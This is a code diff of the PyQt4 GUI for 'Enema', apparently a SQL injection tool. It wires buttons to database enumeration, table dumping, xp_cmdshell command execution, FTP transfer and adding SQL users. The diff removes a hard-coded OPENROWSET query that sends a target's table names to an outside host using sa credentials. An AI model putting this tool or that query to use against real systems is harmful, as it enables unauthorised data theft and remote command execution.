@@ -1,5 +1,5 @@
 """
-    Enema module: GUI events (main).
+    Enema module: GUI events (main)
     Copyright (C) 2011  Valeriy Bogachuk
     
     This program is free software: you can redistribute it and/or modify
@@ -14,13 +14,13 @@
 """
 
 import txtproc
-from injection import ErrorBased
+from core import ErrorBased
 from PyQt4 import QtCore, QtGui 
 from Ui_form import Ui_MainForm
 from Ui_encoder_form import Ui_EncoderForm
 from Ui_about_form import Ui_AboutForm
 
-
+#Enccoder form GUI class
 class EncoderForm(QtGui.QWidget):
     
     
@@ -61,7 +61,7 @@ class EncoderForm(QtGui.QWidget):
         else:
             self.ui.isUrlencoded.setEnabled(False)
 
-
+#About form GUI class
 class AboutForm(QtGui.QWidget):
     
     
@@ -69,8 +69,10 @@ class AboutForm(QtGui.QWidget):
         QtGui.QWidget.__init__(self, parent)
         self.ui = Ui_AboutForm()
         self.ui.setupUi(self)
+        #Set current program version
+        self.ui.versionLabel.setText("Version: 1.2")
         
-        
+#Main form GUI class
 class EnemaForm(QtGui.QMainWindow):
     
     
@@ -78,15 +80,22 @@ class EnemaForm(QtGui.QMainWindow):
         QtGui.QWidget.__init__(self, parent)
         self.ui = Ui_MainForm()
         self.ui.setupUi(self)
-        
         self.ui.progressBar.hide()
         self.ui.progressBarCmd.hide()
         self.ui.progressBarDump.hide()
-        
-        self.ui.queryText.setText(\
-        "insert into OPENROWSET('SQLoledb','uid=sa;pwd=49194919;" \
-        "database=trash;Address=192.168.1.1,21;','select result from tmp')" \
-        " select table_name from information_schema.tables;")
+        #Loading settings
+        settings = QtCore.QSettings("settings.ini", QtCore.QSettings.IniFormat)
+        #FTP
+        self.ui.lineIP.setText(settings.value('FTP/ip', ''))
+        self.ui.lineFtpLogin.setText(settings.value('FTP/login', ''))
+        self.ui.lineFtpPwd.setText(settings.value('FTP/password', ''))
+        self.ui.lineFtpFile.setText(settings.value('FTP/files', ''))
+        self.ui.lineFtpPath.setText(settings.value('FTP/path', ''))
+        #SQL user
+        self.ui.lineAddUserLogin.setText(settings.value('sql_user/login', ''))
+        self.ui.lineAddUserPwd.setText(settings.value('sql_user/password', ''))
+        #Etc
+        self.ui.queryText.setText(settings.value('other/query', ''))
         
 #==================================SIGNALS=BLOCK======================================# 
 #DB_STRUCTURE-TAB ------------
@@ -99,7 +108,6 @@ class EnemaForm(QtGui.QMainWindow):
         self.ui.dmpButton.clicked.connect(self.dmpButton_OnClick)
 #XP_CMDSHELL-TAB ----------
         self.ui.lineCmd.returnPressed.connect(self.lineCmd_OnPressEnter)
-        self.ui.clearCmdButton.clicked.connect(self.clearCmdButton_OnClick)
         self.ui.enableXpcmdButton.clicked.connect(self.enableXpcmdButton_OnClick)
 #upload / query ------------
         self.ui.ftpButton.clicked.connect(self.ftpButton_OnClick)
@@ -111,17 +119,20 @@ class EnemaForm(QtGui.QMainWindow):
         self.ui.saveColumns.triggered.connect(self.saveColumns_OnClick)
         self.ui.saveBases.triggered.connect(self.saveBases_OnClick)
         self.ui.csvExport.triggered.connect(self.csvExport_OnClick)
+        self.ui.save_cmdshell.triggered.connect(self.save_cmdshell_OnClick)
+        self.ui.ssSettings.triggered.connect(self.saveSiteSettings_OnClick)
+        self.ui.spSettings.triggered.connect(self.saveProgramSettings_OnClick)
 #Load Menu-----------------
         self.ui.loadTables.triggered.connect(self.loadTables_OnClick)
         self.ui.loadBases.triggered.connect(self.loadBases_OnClick)
+        self.ui.lsSettings.triggered.connect(self.loadSiteSettings_OnClick)
 #Tools Menu----------------
         self.ui.menuEncoder.triggered.connect(self.menuEncoder_OnClick)
 #Help menu-----------------
         self.ui.menuAbout.triggered.connect(self.menuAbout_OnClick)
 #Db Type change-----------
         self.ui.comboBox_3.currentIndexChanged.connect(self.dbTypeChanged)
-#========================================END==============================================#
-########################################################
+
 #===============================GENERAL-FUNCTIONS=====================================#
 #Get user defined parametes from GUI
     def webData(self):
@@ -132,7 +143,6 @@ class EnemaForm(QtGui.QMainWindow):
         wD = {
               'url' : self.ui.lineUrl.text(), 
               'method' : self.getMethod() , 
-              'errGenerationMethodMSSQL' : self.getErrGenerationMethodMSSQL(),
               'mp' : self.ui.lineMP.text(), 
               'ms' : self.ui.lineMS.text(), 
               'threads' : int(self.ui.threadBox.value()), 
@@ -174,7 +184,6 @@ class EnemaForm(QtGui.QMainWindow):
             self.ui.groupBox_2.setEnabled(False)
             self.ui.groupBox_5.setEnabled(False)
             self.ui.openRowSetButton.setEnabled(False)
-            self.ui.comboBox_2.hide()
             self.ui.tabWidget.setTabEnabled(1, False)
             self.ui.tabWidget.setTabEnabled(3, False)
         else:
@@ -187,10 +196,7 @@ class EnemaForm(QtGui.QMainWindow):
             self.ui.groupBox_2.setEnabled(True)
             self.ui.groupBox_5.setEnabled(True)
             self.ui.openRowSetButton.setEnabled(True)
-            self.ui.comboBox_2.show()
         
-#========================================END==============================================#
-########################################################
 #================================MENU=SAVE=BLOCK======================================#
 #Click on menu save tables
     def saveTables_OnClick(self):
@@ -217,9 +223,23 @@ class EnemaForm(QtGui.QMainWindow):
     def csvExport_OnClick(self):
         filePath = QtGui.QFileDialog.getSaveFileName(self, "Export to csv",
                                                      QtCore.QDir.homePath(),
-                                                     ("CSV Files (*.csv)"))
+                                                     ("CSV files (*.csv)"))
         self.writeToFile(filePath,  "csv")
 
+#Click on menu save xp_cmdshell output
+    def save_cmdshell_OnClick(self):
+        filePath = QtGui.QFileDialog.getSaveFileName(self, "Save xp_cmdshell output",
+                                                     QtCore.QDir.homePath(),
+                                                     ("Text files (*.txt)"))
+        self.writeToFile(filePath,  "cmd")
+        
+#Click on menu save settings
+    def saveSiteSettings_OnClick(self):
+        filePath = QtGui.QFileDialog.getSaveFileName(self, "Save xp_cmdshell output",
+                                                     QtCore.QDir.homePath(),
+                                                     ("INI files (*.ini)"))
+        self.saveSiteSettings(filePath)
+        
 #Write data to file   
     def writeToFile(self, filePath, save):
         try:
@@ -237,15 +257,71 @@ class EnemaForm(QtGui.QMainWindow):
                 for i in range(self.ui.dbListComboBox.count()):
                     db_name = self.ui.dbListComboBox.itemText(i)
                     file.write(db_name + "\n")
+            elif save == "csv":
+                strLine = ""
+                for row in range(self.ui.tableWidget.rowCount()):
+                    for column in range(self.ui.tableWidget.columnCount()):
+                        strLine +=  str(self.ui.tableWidget.item(row, column).data(QtCore.Qt.DisplayRole)) + ";"
+                    strLine = strLine[:-1] + "\n"
+                file.write(strLine)
             else:
-                for r in range(self.ui.tableWidget.rowCount()):
-                    for c in range(self.ui.tableWidget.columnCount()):
-                        file.write(self.ui.tableWidget.item(r, c).text()+ "\n")
+                for row in range(self.ui.cmdOutput.rowCount()):
+                    buff = ""
+                    buff += str(self.ui.cmdOutput.item(row, 1).data(QtCore.Qt.DisplayRole) + "\n")
+                    file.write(buff)
             file.close()
         except Exception:
             return
-#=========================================END=============================================#
-########################################################
+
+#Saving program settings
+    def saveProgramSettings_OnClick(self):
+        settings = QtCore.QSettings("settings.ini", QtCore.QSettings.IniFormat)
+        #FTP settings
+        settings.setValue('FTP/ip', self.ui.lineIP.text())
+        settings.setValue('FTP/login', self.ui.lineFtpLogin.text())
+        settings.setValue('FTP/password', self.ui.lineFtpPwd.text())
+        settings.setValue('FTP/files', self.ui.lineFtpFile.text())
+        settings.setValue('FTP/path', self.ui.lineFtpPath.text())
+        settings.setValue('FTP/get', self.ui.radioGet.isChecked())
+        settings.setValue('FTP/send', self.ui.radioSend.isChecked())
+        #Add sql user settings
+        settings.setValue('sql_user/login', self.ui.lineAddUserLogin.text())
+        settings.setValue('sql_user/password', self.ui.lineAddUserPwd.text())
+        settings.setValue('other/query',  self.ui.queryText.toPlainText())
+
+#Saving site settings
+    def saveSiteSettings(self, filepath):
+        settings = QtCore.QSettings(filepath, QtCore.QSettings.IniFormat)
+        #Making tables list to config format - table1>>table2>>etc...
+        tables = ""
+        if self.ui.listOfTables.count() > 0:
+            for i in range(self.ui.listOfTables.count()):
+                tables += self.ui.listOfTables.item(i).text() + ">>"
+        #Making bases list to config format - base1>>base2>>etc...
+        bases = ""
+        if self.ui.dbListComboBox.count() > 0:
+            for i in range(self.ui.dbListComboBox.count()):
+                bases += self.ui.dbListComboBox.itemText(i) + ">>"
+        #db_strucure tab settings
+        settings.setValue('db_structure/url', self.ui.lineUrl.text())
+        settings.setValue('db_structure/method', self.ui.comboBox.currentIndex())
+        settings.setValue('db_structure/data', self.ui.textEdit.toPlainText())
+        settings.setValue('db_structure/cookies', self.ui.lineCookie.text())
+        settings.setValue('db_structure/db_type', self.ui.comboBox_3.currentIndex())
+        settings.setValue('db_structure/pattern', self.ui.lineMP.text())
+        settings.setValue('db_structure/symbol', self.ui.lineMS.text())
+        settings.setValue('db_structure/tables', tables)
+        settings.setValue('db_structure/bases', bases)
+        settings.setValue('db_structure/current_db', self.ui.dbListComboBox.currentIndex())
+        settings.setValue('db_structure/threads', self.ui.threadBox.value())
+        settings.setValue('db_structure/timeout', self.ui.lineTimeout.text())
+        #dump tab settings
+        settings.setValue('dump/table', self.ui.lineTable.text())
+        settings.setValue('dump/columns', self.ui.lineColumns.text())
+        settings.setValue('dump/key', self.ui.lineKey.text())
+        settings.setValue('dump/from', self.ui.lineFrom.text())
+        settings.setValue('dump/to', self.ui.lineTo.text())
+        
 #================================MENU=LOAD=BLOCK======================================#
 #Click on menu load tables
     def loadTables_OnClick(self):
@@ -261,6 +337,13 @@ class EnemaForm(QtGui.QMainWindow):
                                                      ("Text files (*.txt)"))
         self.readFromFile(filePath, "bases")
         
+#Click on menu load site settings  
+    def loadSiteSettings_OnClick(self):
+        filePath = QtGui.QFileDialog.getOpenFileName(self, "Load bases", 
+                                                     QtCore.QDir.homePath(),
+                                                     ("INI files (*.ini)"))
+        self.loadSiteSettings(filePath)
+        
 #Read data from file
     def readFromFile(self, filePath, load):
         try:
@@ -271,6 +354,7 @@ class EnemaForm(QtGui.QMainWindow):
                 self.ui.listOfTables.clear()
                 for line in buff:
                     self.ui.listOfTables.addItem(line)
+                self.ui.totalLabel.setText(str(self.ui.listOfTables.count()))
             else:
                 self.ui.dbListComboBox.clear()
                 for line in buff:
@@ -278,34 +362,58 @@ class EnemaForm(QtGui.QMainWindow):
             file.close()
         except Exception:
             return
-#========================================END==========================================#
-######################################################
-#================================MENU=TOOLS=BLOCK=================================#
+
+#Loading site settings
+    def loadSiteSettings(self, filepath):
+        settings = QtCore.QSettings(filepath, QtCore.QSettings.IniFormat)
+        #Reading tables from config
+        tables = settings.value('db_structure/tables', '').split('>>')
+        self.ui.listOfTables.clear()
+        for tbl in tables:
+            if tbl !='':
+                self.ui.listOfTables.addItem(tbl)
+        self.ui.totalLabel.setText(str(self.ui.listOfTables.count()))
+        #Reading bases from config
+        bases = settings.value('db_structure/bases', '').split('>>')
+        self.ui.dbListComboBox.clear()
+        for db in bases:
+            if  db !='':
+                self.ui.dbListComboBox.addItem(db)
+        #db_strucure tab settings
+        self.ui.lineUrl.setText(settings.value('db_structure/url', ''))
+        self.ui.comboBox.setCurrentIndex(int(settings.value('db_structure/method', 0)))
+        self.ui.textEdit.setText(settings.value('db_structure/data', ''))
+        self.ui.lineCookie.setText(settings.value('db_structure/cookies', ''))
+        self.ui.comboBox_3.setCurrentIndex(int(settings.value('db_structure/db_type', 0)))
+        self.ui.lineMP.setText(settings.value('db_structure/pattern', ''))
+        self.ui.lineMS.setText(settings.value('db_structure/symbol', '~'))
+        self.ui.dbListComboBox.setCurrentIndex(int(settings.value('db_structure/current_db', 0)))
+        self.ui.threadBox.setValue(int(settings.value('db_structure/threads', 10)))
+        self.ui.lineTimeout.setText(settings.value('db_structure/timeout', '30'))
+        #dump tab settings
+        self.ui.lineTable.setText(settings.value('dump/table', ''))
+        self.ui.lineColumns.setText(settings.value('dump/columns', ''))
+        self.ui.lineKey.setText(settings.value('dump/key', ''))
+        self.ui.lineFrom.setText(settings.value('dump/from', '0'))
+        self.ui.lineTo.setText(settings.value('dump/to', '10'))
+        
+#================================MENU=TOOLS======================================#
     def menuEncoder_OnClick(self):
         self.enc_frm = EncoderForm()
         self.enc_frm.show()
-#========================================END==========================================#
-######################################################
-#================================MENU=ABOUT=BLOCK=================================#
+
+#================================MENU=ABOUT======================================#
     def menuAbout_OnClick(self):
         self.about_frm = AboutForm()
         self.about_frm.show()
-#========================================END==========================================#
-######################################################
-#=================================DB/TABLES=BLOCK==================================#
+
+#=================================DB/TABLES=BLOCK================================#
 #Getting request method
     def getMethod(self):
         if str(self.ui.comboBox.currentText()) == "POST":
             return "POST"
         else:
             return "GET"
-
-#Getting request method
-    def getErrGenerationMethodMSSQL(self):
-        if str(self.ui.comboBox_2.currentText()) == "CONVERT":
-            return "CONVERT"
-        else:
-            return "CAST"
  
 #Getting request method
     def getDbType(self):
@@ -336,13 +444,10 @@ class EnemaForm(QtGui.QMainWindow):
         self.t.start()
                 
 #Updating main progressBar
-    @QtCore.pyqtSlot(int, bool, bool)
-    def updatePb(self, pbMax, setZero, hidePb):
+    @QtCore.pyqtSlot(int, bool)
+    def updatePb(self, pbMax, hidePb):
         if hidePb:
             self.ui.progressBar.hide()
-            return
-        if setZero:
-            self.ui.progressBar.setValue(0)
             return
         self.ui.progressBar.setMaximum(pbMax)
         self.ui.progressBar.setValue(self.ui.progressBar.value() + 1)
@@ -395,8 +500,7 @@ class EnemaForm(QtGui.QMainWindow):
     @QtCore.pyqtSlot(str)
     def showInfoMsg(self, msg):
         QtGui.QMessageBox.information(self, "Enema", msg, 1, 0)
-#======================================END==============================================#
-#######################################################
+
 #==============================COLUMNS=BLOCK=========================================#    
 #Get columns button click       
     def getColumnsButton_OnClick(self):
@@ -426,8 +530,7 @@ class EnemaForm(QtGui.QMainWindow):
 #Clear button click
     def cleanThreeButton_OnClick(self):
         self.ui.treeOfTables.clear()
-#=======================================END===============================================#
-########################################################
+
 #==================================DUMP-BLOCK===========================================# 
 #GO button click        
     def dmpButton_OnClick(self):
@@ -450,16 +553,13 @@ class EnemaForm(QtGui.QMainWindow):
         self.t.start()          
 
 #Updating Dump progressBar
-    @QtCore.pyqtSlot(int, bool, bool)
-    def updatePbDump(self, pbMax, setZero, hidePb):
+    @QtCore.pyqtSlot(int, bool)
+    def updatePbDump(self, pbMax, hidePb):
         if hidePb:
             self.ui.progressBarDump.hide()
             self.ui.tabWidget.setTabEnabled(0, True)
             self.ui.tabWidget.setTabEnabled(2, True)
             self.ui.tabWidget.setTabEnabled(3, True)
-            return
-        if setZero:
-            self.ui.progressBarDump.setValue(0)
             return
         self.ui.progressBarDump.setValue(self.ui.progressBarDump.value() + 1)
         
@@ -475,42 +575,40 @@ class EnemaForm(QtGui.QMainWindow):
     @QtCore.pyqtSlot(str)
     def addPosition(self, position):
         self.ui.label_23.setText(position)
-    
-#=======================================END===============================================#
-########################################################
+        
 #=============================XP_CMDSHELL=BLOCK=======================================# 
 #Press Enter in lineCmd
     def lineCmd_OnPressEnter(self):
         wD = self.webData()
         wD['task'] = "cmd"
         self.ui.lineCmd.clear()
+        self.ui.cmdOutput.clear()
         self.ui.progressBar.setValue(0)
+        self.ui.progressBarCmd.setMaximum(0)
         self.ui.progressBarCmd.show()
         self.t = ErrorBased(wD)
-        self.t.cmdSignal.connect(self.cmdOutputAppend)
-        self.t.progressSignal.connect(self.updatePbCmd)
+        self.t.cmdSignal.connect(self.cmdOutputAppend, type=QtCore.Qt.QueuedConnection)
+        self.t.progressSignal.connect(self.updatePbCmd, type=QtCore.Qt.QueuedConnection)
         self.t.start()
 
 #Updating CMD progressBar
-    @QtCore.pyqtSlot(int, bool, bool)
-    def updatePbCmd(self, pbMax, setZero, hidePb):
+    @QtCore.pyqtSlot(int, bool)
+    def updatePbCmd(self, pbMax, hidePb):
         if hidePb:
             self.ui.progressBarCmd.hide()
-            return
-        if setZero:
-            self.ui.progressBarCmd.setValue(0)
             return
         self.ui.progressBarCmd.setMaximum(pbMax)
         self.ui.progressBarCmd.setValue(self.ui.progressBarCmd.value() + 1)
         
 #Add text to textOutput
-    @QtCore.pyqtSlot(str, bool)
-    def cmdOutputAppend(self, string, isLine):
-        if isLine:
-            self.ui.textCmdOutput.append("\n---------------------------------------")
-        self.ui.textCmdOutput.append(string)
-        scrollBar = self.ui.textCmdOutput.verticalScrollBar()
-        scrollBar.setValue(scrollBar.maximum())
+    @QtCore.pyqtSlot(int, str, bool, int)
+    def cmdOutputAppend(self, rowNum, string, build, rowsCount):
+        if build:
+            self.ui.cmdOutput.setRowCount(rowsCount)
+            return
+        rData = QtGui.QTableWidgetItem()
+        rData.setText(string)
+        self.ui.cmdOutput.setItem(rowNum, 0, rData)
 
 #Enable xp_cmdshell button click    
     def enableXpcmdButton_OnClick(self):
@@ -520,11 +618,6 @@ class EnemaForm(QtGui.QMainWindow):
         self.t.msgSignal.connect(self.showInfoMsg)
         self.t.start()
         
-#Clear xp_cmdshell output
-    def clearCmdButton_OnClick(self):
-        self.ui.textCmdOutput.clear()
-#========================================END==========================================#
-######################################################
 #==============================UPLOAD/QUERY=BLOCK=================================#
 #FTP Upload button click        
     def ftpButton_OnClick(self):
@@ -565,9 +658,8 @@ class EnemaForm(QtGui.QMainWindow):
         self.t = ErrorBased(wD)
         self.t.msgSignal.connect(self.showInfoMsg)
         self.t.start()
+        
 #========================================END==========================================#
-######################################################
-#--------------------------------------------------------------------------------------------------------#
 if __name__ == "__main__":
     import sys
     app = QtGui.QApplication(sys.argv)
